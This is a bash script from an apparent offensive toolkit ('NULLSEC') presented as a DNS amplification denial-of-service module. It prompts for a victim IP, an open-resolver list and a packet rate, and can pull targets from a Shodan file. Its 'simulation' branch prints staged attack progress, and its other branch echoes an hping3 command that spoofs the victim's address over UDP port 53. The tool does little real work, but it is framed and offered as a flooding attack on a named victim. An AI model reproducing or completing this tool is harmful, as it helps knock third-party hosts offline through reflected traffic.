#!/bin/bash
# NULLSEC DNS Amplification - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC DNS AMPLIFY ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Target IP (victim): '${RESET})" TARGET; [ -z "$TARGET" ] && TARGET="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] DNS resolvers file: '${RESET})" RESOLVERS; [ -z "$RESOLVERS" ] && RESOLVERS="resolvers.txt"
read -p "$(echo -e ${WHITE}'  [>] Query domain: '${RESET})" DOMAIN; [ -z "$DOMAIN" ] && DOMAIN="ANY dnsamplification.com"
read -p "$(echo -e ${WHITE}'  [>] PPS (packets/sec): '${RESET})" PPS; [ -z "$PPS" ] && PPS="1000"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing DNS amplification attack"
    echo -e "${DIM}[*] Loading resolvers...${RESET}"; sleep 0.3
    echo -e "${GREEN}[+]${RESET} Loaded 5000 open resolvers"
    echo -e "${DIM}[*] Spoofing source IP: $TARGET${RESET}"; sleep 0.4
    echo -e "${GREEN}[+]${RESET} Amplification factor: ~70x"
    for i in 1 2 3 4 5; do
        echo -e "${RED}[▸]${RESET} Sending $((i*PPS/5)) pps -> $TARGET"; sleep 0.4
    done
    echo -e "${RED}[!]${RESET} Attack traffic: ~$((PPS*70/1000)) Mbps reflected to $TARGET"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} hping3 --udp -p 53 --spoof $TARGET"
fi
